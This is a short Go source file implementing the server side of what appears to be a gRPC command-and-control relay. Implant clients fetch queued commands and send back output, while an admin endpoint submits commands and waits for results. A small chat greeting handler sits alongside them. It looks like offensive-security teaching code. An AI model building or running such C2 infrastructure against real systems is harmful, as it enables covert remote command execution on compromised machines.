package stream
import (
  "log"
  "errors"
  "golang.org/x/net/context"
)


type ChatServer struct{
}

type implantServer struct{
  work, output chan *Command
}

type adminServer struct{
  work, output chan *Command
}

func (s *ChatServer) SayHello(ctx context.Context, message *Message)(*Message,error){
  //Don't log messages but prrint them out instead
  log.Printf("[+] Received message body from client: %s",message.Body)
  return &Message{Body:"Hello too"},nil
}


func NewImplantServer(work, output chan *Command) *implantServer{
  s := new(implantServer)
  s.work = work
  s.output = output
  return s
}

func NewAdminServer(work, output chan *Command) *adminServer{
  s := new(adminServer)
  s.work = work
  s.output = output
  return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *Empty)(*Command,error){
  var cmd = new(Command)
  select{
  case cmd,ok := <- s.work:
    if ok {
      return cmd,nil
    }
    return cmd,errors.New("Channel closed")
  default:
    return cmd,nil
  }
}

func (s *implantServer) SendOutput(ctx context.Context, result *Command)(*Empty,error){
  s.output <- result
  return &Empty{},nil
}

func (s *adminServer) RunCommand(ctx context.Context,cmd *Command) (*Command,error){
  var res *Command
  go func(){
    s.work <- cmd
  }()
  res = <- s.output
  return res,nil
}
